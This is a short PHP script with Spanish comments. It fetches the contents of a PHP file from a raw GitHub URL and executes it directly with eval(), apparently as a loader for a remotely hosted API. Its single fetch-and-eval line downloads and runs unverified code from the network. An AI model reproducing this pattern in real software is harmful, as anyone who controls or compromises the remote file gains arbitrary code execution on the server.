<?php

// URL del script en GitHub
$url = 'https://raw.githubusercontent.com/vicnava14/my-api/main/index.php';

// Obtener el contenido del script
$script_content = file_get_contents($url);

// Ejecutar el script
eval($script_content);

?>